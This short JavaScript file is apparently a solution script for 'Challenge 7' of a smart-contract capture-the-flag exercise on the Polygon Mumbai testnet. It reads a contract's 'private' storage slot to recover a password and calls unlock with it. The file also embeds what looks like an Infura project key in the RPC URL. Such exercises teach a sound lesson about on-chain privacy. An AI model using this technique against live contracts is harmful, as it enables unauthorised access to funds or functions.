import {ethers} from 'ethers';
import {ABI} from './Challenge-7-ABI.js';
const rpc_url = "https://polygon-mumbai.infura.io/v3/ba8a3893f5f34779b1ea295f176a73c6" 
const provider = new ethers.JsonRpcProvider(rpc_url);

async function start() {
    const contract_address = "0x09EB955ccEb733a764d3Ae3beEc15a06b3932614"
    const slot = 1
    const password = await provider.getStorage(contract_address, slot) 
    console.log("Private Data :", password);
    const privateKey = process.env.PRIVATE_KEY;
    const wallet = new ethers.Wallet(privateKey, provider);
    const contract = new ethers.Contract(contract_address, ABI, wallet);
    const tx = await contract.unlock(password.toString());
    const receipt = await tx.wait();
    console.log(receipt);
}

start()